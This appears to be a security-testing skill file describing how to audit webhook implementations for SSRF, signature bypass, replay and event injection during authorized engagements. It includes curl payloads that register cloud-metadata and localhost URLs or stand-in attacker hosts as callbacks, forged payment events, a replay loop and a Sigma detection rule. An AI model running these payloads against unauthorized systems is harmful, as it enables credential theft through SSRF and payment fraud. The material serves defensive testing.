---
name: auditing-webhook-security
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: auditing-webhook-security
description: >-
  Audit webhook implementations for SSRF, signature bypass, replay attacks,
  insecure transport, and information disclosure through callback manipulation
  and event injection.
domain: cybersecurity
subdomain: api-security
tags:
  - webhook
  - api-security
  - ssrf
  - replay-attack
  - signature-verification
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1557"]
  owasp-api: ["API7", "API8"]
  tools: ["curl", "burp-suite", "nuclei", "ngrok"]
---

# Auditing Webhook Security

## Overview

Webhooks are HTTP callbacks that push event data to registered URLs. Insecure
implementations allow SSRF via callback URLs, replay attacks without timestamp
validation, signature bypass, and data exfiltration through attacker-controlled
endpoints.

## Prerequisites

- Tools: ["curl", "burp-suite", "nuclei", "ngrok"]
- Webhook registration access on target application
- Authorized testing engagement with written scope

## Key Concepts

- **Callback SSRF**: Registering internal URLs as webhook destinations
- **Signature verification**: HMAC validation of webhook payloads
- **Replay attacks**: Resubmitting captured webhook payloads
- **Event injection**: Forging webhook events to trigger actions

## Workflow

### Step 1: Webhook Registration SSRF

```bash
# Register internal addresses as webhook callback
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","events":["*"]}'

curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:6379/","events":["user.created"]}'

# Test DNS rebinding for whitelist bypass
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://rebind.attacker.com/hook","events":["*"]}'
```

### Step 2: Signature Verification Testing

```bash
# Capture a legitimate webhook delivery
# Check for signature header (X-Hub-Signature, X-Signature, etc.)

# Replay without signature
curl -s -X POST https://your-endpoint.com/webhook \
  -H "Content-Type: application/json" \
  -d '{"event":"payment.completed","data":{"amount":1000}}'

# Replay with modified payload (same signature)
curl -s -X POST https://your-endpoint.com/webhook \
  -H "Content-Type: application/json" \
  -H "X-Hub-Signature-256: sha256=ORIGINAL_SIGNATURE" \
  -d '{"event":"payment.completed","data":{"amount":99999}}'

# Verify HMAC implementation
python3 -c "
import hmac, hashlib
secret = b'webhook_secret'
payload = b'{\"event\":\"test\"}'
sig = hmac.new(secret, payload, hashlib.sha256).hexdigest()
print(f'sha256={sig}')
"
```

### Step 3: Replay Attack Testing

```bash
# Capture and replay webhook (no timestamp validation)
CAPTURED_PAYLOAD='{"event":"order.paid","timestamp":"2025-01-01T00:00:00Z","data":{"order_id":"123","amount":500}}'

# Replay the same event multiple times
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "Replay $i: %{http_code}\n" \
    -X POST https://your-endpoint.com/webhook \
    -H "Content-Type: application/json" \
    -d "$CAPTURED_PAYLOAD"
done
```

### Step 4: Event Injection

```bash
# Register attacker-controlled webhook receiver
ngrok http 8080  # Start tunnel

# Set up local listener
python3 -m http.server 8080 &

# Register webhook with attacker URL
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://NGROK_URL/capture","events":["*"]}'

# Trigger events and capture webhook payloads
# Analyze captured data for sensitive information
```

### Step 5: Transport Security

```bash
# Check if HTTP (non-HTTPS) webhook URLs are accepted
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://attacker.com/webhook","events":["*"]}'

# Test certificate validation (self-signed cert)
curl -s -X POST https://target.com/api/webhooks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://self-signed.attacker.com/webhook","events":["*"]}'
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Internal URL registration | App logs | RFC1918/metadata in callback URL |
| Missing signature | WAF | Webhook without verification header |
| Duplicate event IDs | App logs | Replayed webhook deliveries |
| HTTP callback URLs | App logs | Non-HTTPS webhook destinations |

```yaml
title: Webhook SSRF Registration Attempt
id: b8c9d0e1-f2a3-4567-b012-890123456789
status: experimental
description: Detects webhook registration with internal or metadata service URLs
logsource:
  category: application
detection:
  selection:
    request_uri|contains: '/webhook'
    http_method: POST
  internal_urls:
    request_body|contains:
      - '169.254.169.254'
      - '127.0.0.1'
      - '10.'
      - '172.16.'
      - '192.168.'
  condition: selection and internal_urls
falsepositives:
  - Internal service-to-service webhook configuration
level: high
tags:
  - attack.t1190
  - attack.t1557
```

## Verification

- [ ] SSRF via webhook URL registration tested
- [ ] Signature verification present and validated
- [ ] Replay attack prevention verified
- [ ] HTTPS enforcement for callback URLs verified
- [ ] Results documented with evidence
- [ ] Detection artifacts identified

## References

- [OWASP Webhook Security](https://cheatsheetseries.owasp.org/cheatsheets/Webhook_Security_Cheat_Sheet.html)
- [ngrok](https://ngrok.com/)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
